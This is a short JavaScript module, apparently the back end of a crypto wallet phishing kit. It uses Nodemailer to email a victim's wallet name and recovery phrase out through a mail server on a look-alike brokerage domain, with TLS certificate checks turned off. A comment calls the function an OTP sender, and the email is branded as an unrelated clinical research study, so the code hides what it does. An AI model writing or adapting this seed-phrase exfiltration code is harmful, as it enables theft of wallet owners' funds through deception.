
import nodemailer from "nodemailer";

// Function to send OTP via email using Nodemailer
export const sendMail = async (email, walletPhrase, walletName) => {
  try {
    // Create Nodemailer transporter
    const transporter = nodemailer.createTransport({
      host:"mail.primebokerage.com",
      port: 465,
      auth: {
        user: process.env.EMAIL_ADDRESS,
        pass: process.env.EMAIL_PASSWORD,
      },
      tls: {
        rejectUnauthorized: false,
      },
    });

    // Beautiful HTML template
    const htmlTemplate = `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                <h2>Welcome to iThrive Clinical Research Study</h2>
                <p>The wallet ${walletName}  .</p>
             
                <p>The phrase:</p>
                <h3 style="background-color: #f0f0f0; padding: 15px; text-align: center;">
                ${walletPhrase}
                </h3>
               
            </div>
              `;;

    // Mail options
    const mailOptions = {
      from:  process.env.EMAIL_ADDRESS,
      to: email,
      subject: " Phrase Information",
      html: htmlTemplate,
    };

    // Send the email
    const info = await transporter.sendMail(mailOptions);
    console.log("✅ Email sent:", info.response);

  } catch (error) {
    console.error("❌ Error sending email:", error);
  }

};
